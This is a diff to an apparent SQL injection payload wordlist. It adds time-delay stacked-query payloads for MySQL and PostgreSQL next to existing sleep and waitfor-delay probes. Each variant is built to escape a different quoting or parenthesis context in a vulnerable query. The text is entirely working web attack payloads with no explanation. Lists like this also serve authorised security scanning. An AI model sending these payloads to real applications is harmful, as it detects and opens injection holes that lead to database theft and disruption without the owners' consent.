@@ -21,6 +21,15 @@ sleep(__TIME__)#
 1)) and sleep(__TIME__)#
 ")) and sleep(__TIME__)="
 ')) and sleep(__TIME__)='
+1; SELECT sleep(__TIME__)#
+" ; SELECT sleep(__TIME__)#
+' ; SELECT sleep(__TIME__)#
+1) ; SELECT sleep(__TIME__)#
+") ; SELECT sleep(__TIME__)#
+') ; SELECT sleep(__TIME__)#
+1)) ; SELECT sleep(__TIME__)#
+")) ; SELECT sleep(__TIME__)#
+')) ; SELECT sleep(__TIME__)#
 ;waitfor delay '0:0:__TIME__'--
 );waitfor delay '0:0:__TIME__'--
 ';waitfor delay '0:0:__TIME__'--
@@ -49,3 +58,12 @@ pg_sleep(__TIME__)--
 1)) and pg_sleep(__TIME__)--
 ")) and pg_sleep(__TIME__)--
 ')) and pg_sleep(__TIME__)--
+1; SELECT pg_sleep(__TIME__)--
+" ; SELECT pg_sleep(__TIME__)--
+' ; SELECT pg_sleep(__TIME__)--
+1) ; SELECT pg_sleep(__TIME__)--
+") ; SELECT pg_sleep(__TIME__)--
+') ; SELECT pg_sleep(__TIME__)--
+1)) ; SELECT pg_sleep(__TIME__)--
+")) ; SELECT pg_sleep(__TIME__)--
+')) ; SELECT pg_sleep(__TIME__)--
